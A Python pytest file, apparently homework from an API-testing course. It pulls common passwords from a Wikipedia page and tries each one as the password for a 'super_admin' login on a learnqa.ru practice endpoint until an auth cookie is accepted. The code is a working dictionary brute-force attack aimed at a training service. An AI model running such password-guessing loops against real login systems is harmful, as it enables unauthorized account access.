from functools import reduce
import requests
from lxml import html


def test_guess_password():
    unauthorized = "You are NOT authorized"
    authorized = "You are authorized"
    locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'

    response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
    tree = html.fromstring(response.text)
    passwords = tree.xpath(locator)

    #Filter unique passwords to optimize list in loop
    uniquePasswords = reduce(lambda l, x: l.append(x) or l if x not in l else l, passwords, [])
    print(f"\nUnique passwords count: '{len(uniquePasswords)}' vs. all passwords in grid: '{len(passwords)}'")

    i = 0
    for password in uniquePasswords:
        password = str(password).strip()

        data = {
            'login': 'super_admin',
            'password': password
        }
        response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)

        assert "auth_cookie" in response1.cookies, f"Can not find 'auth_cookie' in response"
        auth_cookie = response1.cookies["auth_cookie"]

        response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                 cookies={"auth_cookie": auth_cookie})
        if response2.text == unauthorized:
            print(f"Try again with right password, {unauthorized}, :(")
            i += 1
        elif response2.text == authorized:
            print(f"Congratulation, {authorized}! :)")
            print(f"You tried authorize '{i}' times and your happy auth_cookie is: '{auth_cookie}'. "
                  f"Don't forget your '{password}' password next time")
            break


